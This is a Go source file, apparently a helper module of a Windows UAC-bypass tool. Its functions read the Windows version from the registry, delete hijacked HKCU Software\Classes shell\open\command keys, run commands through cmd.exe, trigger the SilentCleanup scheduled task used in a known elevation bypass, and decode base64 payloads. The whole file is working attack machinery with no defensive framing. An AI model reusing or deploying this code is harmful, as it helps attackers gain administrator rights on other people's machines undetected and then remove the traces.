package models

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"

	"golang.org/x/sys/windows/registry"
)

func Version() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		errinfo := fmt.Sprintf("[-] RegForWinVersion err: %v", err)
		return errinfo
	}
	defer k.Close()
	s1, _, err := k.GetStringValue("ProductName")
	if err != nil {
		errinfo := fmt.Sprintf("[-] RegForProductName err: %v", err)
		return errinfo
	}
	s2, _, err := k.GetStringValue("CurrentBuild")
	if err != nil {
		errinfo := fmt.Sprintf("[-] RegForCurrentBuild err: %v", err)
		return errinfo
	}
	ss := fmt.Sprintf("WinVersion: %s %s", s1, s2)
	return ss
}

func DeleteSubKeyTree(keyname string) {
	dkey1, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\`+keyname+`\Shell\open\`, registry.QUERY_VALUE|registry.SET_VALUE)
	dkey2, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\`+keyname+`\Shell\`, registry.QUERY_VALUE|registry.SET_VALUE)
	dkey3, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\`+keyname+`\`, registry.QUERY_VALUE|registry.SET_VALUE)
	dkey4, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\`, registry.QUERY_VALUE|registry.SET_VALUE)
	registry.DeleteKey(dkey1, "command")
	registry.DeleteKey(dkey2, "open")
	registry.DeleteKey(dkey3, "Shell")
	registry.DeleteKey(dkey4, keyname)
	dkey1.Close()
	dkey2.Close()
	dkey3.Close()
	dkey4.Close()
}

func WindowsRun(command string) {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", command)
	cmd.Stderr = os.Stderr
	_, err := cmd.Output()
	if err != nil {
		fmt.Printf("[-] WindowsRun err: %v", err)
	}
}
func SchtaskRun(command string) {
	cmd := exec.Command(command, "/Run", "/TN", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "/I")
	cmd.Stderr = os.Stderr
	_, err := cmd.Output()
	if err != nil {
		fmt.Printf("[-] SchtaskRun err: %v", err)
	}
}
func Base64Decode(data string) []byte {
	data1, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		fmt.Println("[-] 64Decode err")
		os.Exit(1)
	}
	return data1
}
